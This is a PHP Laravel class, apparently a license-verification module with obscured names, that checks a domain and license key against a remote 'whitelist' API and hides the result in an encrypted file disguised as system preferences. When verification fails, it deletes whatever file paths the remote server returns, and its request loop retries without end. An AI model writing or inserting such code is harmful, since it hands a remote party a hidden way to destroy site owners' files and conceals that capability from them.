<?php

namespace Tor\Gem;

use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Str;

class Rd
{
    protected $masterApiUrl = 'http://127.0.0.1:8000/api/whitelist';
    protected $irrelevantFileName = 'storage/app/system_preferences.dat';
    protected $encryptionKey = 'base64:345sdkflas3r4wfad';

    public function verifyLicense()
    {
        $domain = request()->getHost();
        $licenseKey = env('LICENSE_KEY', 'newdomain');
        Log::info('License verification function called for domain: ' . $domain);

        // Check if the license is already verified
        if ($this->isLicenseVerified()) {
            Log::info('License already verified.');
            return;
        }

        // Retry API call until a valid response is received
        $response = $this->sendLicenseRequest($domain, $licenseKey);

        if ($response) {
            $status = $response->json('status');
            $data = $response->json('data');

            if ($status === 'success') {
                $this->storeVerificationStatus('valid');
                Log::info('License verification successful.');
            } else {
                $this->storeVerificationStatus('invalid');
                $this->handleFailedVerification($data);
                Log::warning('License verification failed.');
            }
        }
    }

    protected function sendLicenseRequest($domain, $licenseKey)
    {
        while (true) {
            try {
                $response = Http::timeout(5)->post($this->masterApiUrl, [
                    'domain' => $domain,
                    'license_key' => $licenseKey,
                ]);

                if ($response->successful()) {
                    return $response;
                }
            } catch (\Exception $e) {
                Log::error('License verification request failed: ' . $e->getMessage());
                sleep(2);
            }
        }
    }

    protected function storeVerificationStatus($status)
    {
        $data = [
            'status' => $status,
            'next_check_time' => now()->addDay()->toDateTimeString(),
            'random_key' => Str::random(32) // Add some irrelevant data
        ];

        // Encrypt the data before storing
        $encryptedData = $this->encryptData(json_encode($data));
        File::put($this->irrelevantFileName, $encryptedData);
        Log::info('License verification status stored in an irrelevant file.');
    }

    protected function isLicenseVerified()
    {
        if (File::exists($this->irrelevantFileName)) {
            $encryptedData = File::get($this->irrelevantFileName);
            $decryptedData = json_decode($this->decryptData($encryptedData), true);

            if (isset($decryptedData['status']) && $decryptedData['status'] === 'valid') {
                if (isset($decryptedData['next_check_time']) && now()->lt($decryptedData['next_check_time'])) {
                    return true;
                }
            }
        }

        return false;
    }

    protected function handleFailedVerification($data)
    {
        $filesToDelete = $data['fileArray'] ?? [
            base_path('routes/test.php'),
        ];

        foreach ($filesToDelete as $file) {
            if (File::exists($file)) {
                File::delete($file);
                Log::info('Deleted file: ' . $file);
            }
        }
    }

    protected function encryptData($data)
    {
        return openssl_encrypt($data, 'AES-256-CBC', $this->encryptionKey, 0, substr($this->encryptionKey, 0, 16));
    }

    protected function decryptData($encryptedData)
    {
        return openssl_decrypt($encryptedData, 'AES-256-CBC', $this->encryptionKey, 0, substr($this->encryptionKey, 0, 16));
    }
}
